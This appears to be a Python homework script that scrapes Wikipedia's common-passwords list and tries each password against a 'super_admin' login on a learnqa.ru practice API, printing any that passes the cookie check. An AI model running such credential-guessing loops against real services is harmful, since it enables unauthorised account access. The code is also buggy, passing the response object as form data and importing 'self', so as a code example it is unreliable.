import requests
import self as self
from selenium import webdriver
from selenium.webdriver.common.by import By

class seleniun_collectdata:

    def __init__(self):
        self.wd = webdriver.Chrome()

    def open_wiki_page(self):
        wd = self.wd
        wd.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

    def get_passwords_list(self):
            wd = self.wd
            self.open_wiki_page()
            list_password=[]
            rows = wd.find_elements(by=By.XPATH, value="//table[@class='wikitable'][2]/tbody/tr[position() >1]")
            #colomn =
            for element in rows:
                cell = element.find_element(by=By.XPATH, value="./td[@align='left']").text

                list_password.append(cell)
            return list(list_password)

class TestAPI:

    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    url_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    login= "super_admin"


    list_password = seleniun_collectdata().get_passwords_list()

    for value in list_password:
        response = requests.post(url, data={"login": login, "password": value})
        print(response.cookies)
        response_1 = requests.post(url_cookie, data={"cookies": response}).text
        if (response_1 != 'You are NOT authorized') \
                : print(value)
